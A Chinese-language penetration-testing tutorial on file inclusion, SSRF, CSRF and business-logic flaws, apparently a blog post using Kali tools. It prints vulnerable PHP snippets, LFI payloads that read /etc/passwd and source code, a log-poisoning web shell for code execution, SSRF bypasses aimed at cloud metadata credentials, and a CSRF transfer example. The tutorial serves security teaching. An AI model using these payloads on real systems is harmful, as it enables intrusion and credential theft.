---
title: Web 高级渗透测试：文件注入、SSRF、CSRF 与逻辑漏洞
slug: kali-4-web高级漏洞渗透-1a2b3
date: 2026-09-12
visibility: public
tags: Kali Linux, Web安全, 文件包含, SSRF, CSRF, 逻辑漏洞, 渗透测试, 教程
---

# Web 高级渗透测试：文件注入、SSRF、CSRF 与逻辑漏洞

> 基础的 SQL 注入与 XSS 已是常识，但真正拉开差距的是**高级 Web 漏洞**：文件包含、SSRF、CSRF、逻辑漏洞。这些漏洞往往藏得更深、危害更大。本文用 Kali 带你逐一击破。

## 一、文件包含漏洞（LFI/RFI）

### 原理

```php
// 危险代码：直接用用户输入拼路径
include($_GET['page'] . '.php');
```

| 类型 | 说明 | 风险 |
|------|------|------|
| LFI | 本地文件包含 | 读取任意文件 |
| RFI | 远程文件包含 | 执行远程代码 |

### 利用方式

```bash
# 读取系统文件（LFI）
http://target/index.php?page=../../../../etc/passwd

# 用 PHP 过滤器直接读源码
http://target/index.php?page=php://filter/read=convert.base64-encode/resource=config.php

# 日志投毒 → RCE（配合 User-Agent 写入 shell）
# 1. 请求时 UA 写 <?php system($_GET['c']);?>
# 2. 包含日志文件
http://target/index.php?page=/var/log/apache2/access.log&c=id
```

## 二、SSRF（服务端请求伪造）

### 原理

服务器替攻击者发起请求，可绕过边界访问内网。

```php
$url = $_GET['url'];
$data = file_get_contents($url);  // 危险
```

### 利用场景

```
1. 探测内网端口（127.0.0.1 / 内网 IP）
2. 访问云元数据服务（169.254.169.254 → 拿云凭证）
3. 读取本地文件（file:// 协议）
4. 打内网 Redis/MySQL 等
```

### 绕过姿势

```bash
# 常见绕过：URL 混淆
http://127.0.0.1 -> http://2130706433（整数IP）
http://localhost -> 127.0.0.1
http://[::1]
# 重定向绕过：302 跳转内网
# DNS 重绑定
```

## 三、CSRF（跨站请求伪造）

### 原理

用户已登录状态下，被诱导访问恶意页面，恶意页面自动提交请求。

```
受害者已登录银行
攻击者构造图片：
  <img src="http://bank.com/transfer?to=attacker&amount=10000">
受害者浏览恶意页面 → 自动发起转账
```

### 检测与利用

```bash
# 检查请求是否带 Token / SameSite / 校验 Referer
# 用 Burp 拦截转账请求 → 去掉 Token 看是否仍成功
# 构造 HTML PoC（Burp 自带 Generate CSRF PoC）
```

## 四、业务逻辑漏洞

| 漏洞 | 场景 |
|------|------|
| 越权（IDOR） | 修改 id 参数访问他人数据 |
| 支付逻辑 | 修改金额/数量/优惠码 |
| 验证码绕过 | 固定验证码、并发绕过 |
| 密码重置 | 修改重置链接参数 |
| 优惠券复用 | 无限使用 |

### 实战示例：IDOR

```
1. 登录 A 账号 → 查看订单 /order?id=1001
2. 改为 1002 → 看到 B 的订单（越权！）
3. Burp Repeater 批量验证
```

## 五、Kali 实战工具

| 工具 | 用途 |
|------|------|
| Burp Suite | 抓包/重放/扫描 |
| sqlmap | SQL 注入自动化 |
| dirsearch | 目录爆破 |
| nikto | Web 服务器扫描 |
| wpscan | WordPress 专项 |

## 安全合规

> 高级 Web 漏洞利用能力只用于**授权测试**。对未授权目标尝试利用 = 违法。

## 小结

- 文件包含 + PHP 过滤器 = 读源码 → 可能 RCE
- SSRF 是"内网入口"，云元数据是最高价值目标
- CSRF 靠"无痕请求"得手，重点是验证防护缺失
- 逻辑漏洞（越权/改价）用 Burp 手工测试最有效
- 高级漏洞组合起来往往比单点漏洞危害更大

> 下一篇：数据库渗透测试——从口令爆破到数据脱库。